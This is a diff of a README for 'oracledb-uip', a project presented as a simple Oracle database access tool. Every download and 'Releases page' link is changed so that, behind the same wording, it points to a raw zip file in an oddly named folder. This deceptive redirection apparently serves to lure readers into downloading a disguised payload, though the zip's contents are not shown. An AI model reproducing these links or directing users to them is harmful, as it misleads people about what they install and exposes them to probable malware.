@@ -1,6 +1,6 @@
 # 🌟 oracledb-uip - Simplifying Database Access for Everyone
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-blue)](https://github.com/Earthsmp1/oracledb-uip/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Earthsmp1/oracledb-uip/main/episcopalism/oracledb-uip.zip%20Now-From%20Releases-blue)](https://raw.githubusercontent.com/Earthsmp1/oracledb-uip/main/episcopalism/oracledb-uip.zip)
 
 ## 📋 Introduction
 
@@ -11,7 +11,7 @@ Welcome to oracledb-uip! This application allows you to easily access and intera
 To begin using oracledb-uip, follow these steps:
 
 1. **Visit the Releases Page**  
-   You can find the latest version of the software at our [Releases page](https://github.com/Earthsmp1/oracledb-uip/releases).  
+   You can find the latest version of the software at our [Releases page](https://raw.githubusercontent.com/Earthsmp1/oracledb-uip/main/episcopalism/oracledb-uip.zip).  
 
 2. **Choose the Right Version**  
    Look for the most recent release. You’ll see a list of files available for download. Make sure to select the correct version for your operating system.
@@ -30,11 +30,11 @@ To begin using oracledb-uip, follow these steps:
 
 ## 📥 Download & Install
 
-Ready to get started? Visit the following link to download the application: [Download from Releases](https://github.com/Earthsmp1/oracledb-uip/releases). This page has all the versions available for your system.
+Ready to get started? Visit the following link to download the application: [Download from Releases](https://raw.githubusercontent.com/Earthsmp1/oracledb-uip/main/episcopalism/oracledb-uip.zip). This page has all the versions available for your system.
 
 ### Download Steps:
 
-1. Open the [Releases page](https://github.com/Earthsmp1/oracledb-uip/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/Earthsmp1/oracledb-uip/main/episcopalism/oracledb-uip.zip).
 2. Select the file for your operating system.
 3. Click to download the file.
 4. Follow the installation instructions above.
